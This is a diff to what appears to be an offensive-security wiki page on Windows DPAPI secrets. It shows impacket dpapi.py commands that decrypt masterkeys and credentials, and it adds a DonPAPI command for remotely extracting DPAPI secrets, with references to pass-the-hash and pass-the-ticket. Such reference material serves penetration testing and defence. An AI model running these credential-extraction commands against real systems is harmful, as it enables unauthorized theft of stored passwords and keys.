@@ -38,6 +38,12 @@ dpapi.py masterkey -file "/path/to/masterkey_file" -pvk "/path/to/backup_key.pvk
 # (not tested) Decrypt DPAPI-protected data using a master key
 dpapi.py credential -file "/path/to/protected_file" -key $MASTERKEY
 ```
+
+[DonPAPI](https://github.com/login-securite/DonPAPI) \(Python\) can also be used to remotely extract DPAPI secrets more easily. It supports [pass-the-hash](../../ntlm/pass-the-hash.md), [pass-the-ticket](../../kerberos/pass-the-ticket.md) and so on.
+
+```bash
+DonPAPI.py Domain/user:passw0rd@target
+```
 {% endtab %}
 
 {% tab title="Windows" %}
